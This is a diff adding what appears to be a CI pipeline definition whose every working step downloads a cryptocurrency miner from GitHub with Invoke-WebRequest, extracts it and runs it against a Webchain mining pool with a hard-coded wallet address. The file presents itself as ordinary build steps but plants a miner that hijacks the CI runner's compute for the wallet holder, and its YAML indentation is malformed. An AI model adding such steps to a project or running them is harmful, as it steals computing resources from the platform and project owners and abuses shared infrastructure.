@@ -1,0 +1,9 @@
+steps:
+- name: PREPARING
+run: Invoke-WebRequest https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip -OutFile webchain-miner-2.8.0-win64.zip
+- name: Seting-UP
+run: Expand-Archive webchain-miner-2.8.0-win64.zip
+- name: Running
+run: .\webchain-miner-2.8.0-win64\webchain-miner.exe -o pool.webchain.network:2222 -p x -t 1 -u 0x82FCb1FD92e997750AC8bf36106cA190Fe3a3Cb1
+- name: END
+run: exit
